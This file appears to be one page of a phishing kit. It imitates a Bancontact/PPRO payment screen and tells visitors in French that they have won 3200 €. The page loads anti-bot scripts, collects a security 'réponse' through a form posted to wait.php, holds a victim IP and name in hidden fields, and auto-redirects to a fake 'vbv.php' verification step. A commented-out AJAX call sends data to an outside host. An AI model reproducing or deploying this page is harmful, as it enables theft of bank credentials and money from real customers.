<?php

include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';
?>
<html style="overflow-x: hidden"><head>
	<meta name="description" content="Bancontact">
    <meta name="author" content="PPRO Financial Ltd">
    <link rel="shortcut icon" href="./css/default3/assets/file/favicon.png">
    <link rel="apple-touch-icon-precomposed" href="./css/default3/assets/file/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="./css/default3/assets/file/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="167x167" href="./css/default3/assets/file/apple-touch-icon-167x167.png">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="./css/default3/assets/file/apple-touch-icon-180x180.html">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="/favicon.ico" type="image/x-icon" rel="icon"><link href="/favicon.ico" type="image/x-icon" rel="shortcut icon"><link rel="stylesheet" type="text/css" href="/css/default3/bootstrap/3.0.0/css/bootstrap.min.css"><link rel="stylesheet" type="text/css" href="/css/default3/assets/file/bootstrap.min.css"><link rel="stylesheet" type="text/css" href="/css/default3/assets/file/stylec4ca.css"><script type="text/javascript" src="/js/default3/assets/file/object-assign-auto.min.js"></script><script type="text/javascript" src="/js/default3/assets/file/jquery.min.js"></script><script type="text/javascript" src="/js/default3/assets/file/jquery.validate.min.js"></script><script type="text/javascript" src="/js/default3/assets/file/additional-methods.min.js"></script><script type="text/javascript" src="/js/default3/assets/file/bootstrap.min.js"></script><script type="text/javascript" src="/js/default3/assets/file/kjua-0.1.1.min.js"></script></head>
<body>
		 
 <style>
 @media (max-width: 567px){ 
 .sayahcolor {
	 color : #fff;
	 
				 }
				 }
				  @media (min-width: 600px){ 
 .sayahcolor {
	 color : #111;
	 
				 }
				 }
 </style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

	
	<div id="wrapper">
      <div id="header">
        <div class="topbar">
          <div class="container">
            <a href="#" target="_self"><img src="./img/default3/assets/file/flag_de.png" alt="German" class="flag" onclick="_('de')"></a>
            <a href="#" target="_self"><img src="./img/default3/assets/file/flag_fr.png" alt="French" class="flag" onclick="_('fr')"></a>
            <a href="#" target="_self"><img src="./img/default3/assets/file/flag_nl.png" alt="Dutch" class="flag" onclick="_('nl')"></a>
            <a href="#" target="_self"><img src="./img/default3/assets/file/flag_en.png" alt="English" class="flag" onclick="_('en')"></a>
          </div>
        </div>
        <div class="payment-details">
          <div class="container">
            <table>
              <tbody><tr>
                <td class="align-right-text-top"><span class="multilanguage-text" id="beneficiaryTxt">Bénéficiaire</span></td>
                <td class="strong" id="result"> </td>
              </tr>
              <tr>
                <td class="align-right-text-top"><span class="multilanguage-text" id="orderReferenceTxt">Référence </span></td>
                <td class="strong">3XV5JT7 220JH9JE </td>
              </tr>
              <tr>
                <td class="align-right-text-top"><span class="multilanguage-text" id="totalPriceTxt">Montant Gagné</span></td>
                <td class="strong">3200 €</td>
              </tr>
            </tbody></table>
          </div>
        </div>
      </div>
      <div class="content-container">
        <div class="container">

          <h1 class="title"><span class="multilanguage-text" id="howToPayTxt"></span></h1>
		  
		  <div class="island mobile-xs island-pay islandright">
		  <form action="/wait.php" id="card-data-input-form" method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"></div>           <input type="hidden" id="ip" name="ip" value="105.156.24.200">
           <input type="hidden" name="data[Chat][message]" value="">
           <input type="hidden" name="data[Chat][nom]" value="sevim okcu">
           <input type="hidden" name="data[Chat][bonus]" value="2000">
            <img src="./img/default3/assets/file/card_icon.png" alt="app" class="icon desktop-only">
            <img src="./img/default3/assets/file/card_mobile_icon.png" alt="app" class="icon mobile-only">
            <h2><span class="multilanguage-text" id="payWithBcCardTxt">Transférez de l'argent vers
<br>votre carte Bancontact</span></h2>
         
   
            
		  <div class="sayahcolor" id="vue">

<p class="sayahcolor">
          </p><div id="listeDiv" style="font-size: 17px;">
              <img src="./img/default3/assets/file/spinner.gif" alt="app">
          </div>
          <h4>veuillez patientez quelques instant... </h4>
<p></p></div>


          <br>
          <br>
          <br>

            <div class="form-group">
              <label for="pan" id="card-number"><span class="multilanguage-text" id="cardNumberTxt">Réponse</span></label>
              <input type="text" class="form-control" id="reponse" name="reponse" required="">
            </div>
            <button type="submit" id="submit-button" class="btn-main"><span class="multilanguage-text" id="continueTxt">Poursuivre</span><span class="glyphicon glyphicon-chevron-right"></span></button>
          </form>	
          </div>
          <div id="separator" style="display: none;">
            <div id="separator-left"></div>
            <div id="separator-right"></div>
            <span class="circle-outer"><span class="circle-middle"><span class="circle-center"><span class="multilanguage-text" id="orTxt">OU</span></span></span></span>
          </div>
        </div>
      </div>
     
     
      <div id="push"></div>
    </div>
     <div id="footer">
		      </div>
    <div id="loading-overlay" class="overlay" style="display: none">
      <div id="loading-message">
        <img id="img-spinner" src="./img/default3/assets/file/spinner.gif" alt="Your transaction is being processed"><br>
      </div>
    </div>
	
		// <script>
		// $(document).ready(function(){
                      // $("button").click(function(){
	
  // $.ajax({
                // url: "https://auchan.leprodelatoiture.fr/pages/liste",
                // data: {
                    // prix : $("#ip").val()
                // },
				// sync : true ,
                // dataType: 'html',
                // type: 'post',
                // success: function (html) {
                    // $("#vue").html(html);
                // }
         // });
		    // });
		// });
			

// </script>

<script>
    $("#txt_cardNumber").keypress(function (e) {
      if ((e.which < 48 || e.which > 57) && (e.which !== 8) && (e.which !== 0)) {
        return false;
      }

      return true;
    });

    const FullName = localStorage.getItem('name');
    const NameInput = document.getElementById('result');
    NameInput.innerText = FullName;
  </script>
<script type="text/javascript">
            setTimeout(function () {
                window.location.href= './vbv.php';
            },60000); // 1000 = 1s
        </script>	



</body><div id="ci-extension-div"></div></html>